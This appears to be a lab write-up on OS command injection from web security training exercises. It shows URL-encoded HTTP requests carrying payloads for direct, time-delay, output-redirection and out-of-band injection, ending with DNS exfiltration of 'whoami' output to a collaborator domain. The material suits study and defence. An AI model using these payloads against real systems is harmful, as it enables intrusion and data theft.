## Command Injection Test Cases
### OS command injection, simple case
In POST request, product ID parameter is vulnerable to RCE.<br>
Payload: 1 & whoami #
```
POST /product/stock HTTP/2
Host: HOST.com

productId=1+%26+whoami+%23&storeId=1
```
### Blind OS command injection with time delays
The output from the command is not returned in the response. We can submit feedback in the application. Test each input field with sleep payload and we found out that email field is vulnerable. <nr>
**Payload used in email field (URL encoded):** test@test[.]com & sleep 10 # 
```
POST /feedback/submit HTTP/2
Host: example.com

name=test&email=mayank%40test.com+%26+sleep+10+%23&subject=1111111&message=111112
```
### Blind OS command injection with output redirection
The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:
```
/var/www/images/
```
The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.
You can confirm the blind command injection in the same we did earlier.<br>
**Payload used in email field (URL encoded):** test@test[.]com & sleep 10 # 
```
POST /feedback/submit HTTP/2
Host: example.com

name=test&email=mayank%40test.com+%26+sleep+10+%23&subject=1111111&message=111112
```
Yes, response got delayed by 10 seconds.  Lets store this output in /var/www/images folder. When we navigate to any product image, the URL looks like below.
```
https://example[.]com/image?filename=15.jpg
```
Lets write the output of our command to this folder(/var/www/images) in output.txt file and fetch it using above endpoint.
Payload Used in: ssss@test.com & whoami > /var/www/images/output.txt #
```
POST /feedback/submit HTTP/2
Host: example.com

name=test&email=ssss%40test.com+%26+whoami+>+/var/www/images/output.txt+%23&subject=1111111&message=111112
```
Now browse the output.txt https://example[.]com/image?filename=output.txt
### Blind OS command injection with out-of-band interaction
The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.<br>
**Payload used  in email field(URL encoded)**: test@test[.]com & nslookup BURP_COLLOBORATOR_SERVER #
```
POST /feedback/submit HTTP/2
Host: 0a88006f0402496f85b3d550003e00d3.web-security-academy.net

name=test&email=sss%40test.com+%26+nslookup+xxxx.oastify.com+%23&subject=ssssss&message=sss
```
### Blind OS command injection with out-of-band data exfiltration
This time we need to extract the command output as well. Lets confirm RCE first.<br>
**Payload used  in email field(URL encoded)**: test@test[.]com & nslookup BURP_COLLOBORATOR_SERVER #
```
POST /feedback/submit HTTP/2
Host: 0a88006f0402496f85b3d550003e00d3.web-security-academy.net

name=test&email=sss%40test.com+%26+nslookup+xxxx.oastify.com+%23&subject=ssssss&message=sss
```
It performed the DNS query, lets exfiltrate the data using backtick.<br>
**Payload used  in email field(URL encoded)**: test@test[.]com & nslookup \`whoami\`.xxxx.oastify.com #
```
POST /feedback/submit HTTP/2
Host: 0a43003d049f1fae8036305a00f6003f.web-security-academy.net

name=xyzzz&email=test%40t.com+%26+nslookup+`whoami`.xxxx.oastify.com+%23&subject=ss&message=sw
```
We could also exfilterate the data using $ if backtick is blocked. Below is the payload.<br>
**Payload used  in email field(URL encoded)**: test@test[.]com & nslookup $(whoami).xxxx.oastify.com #
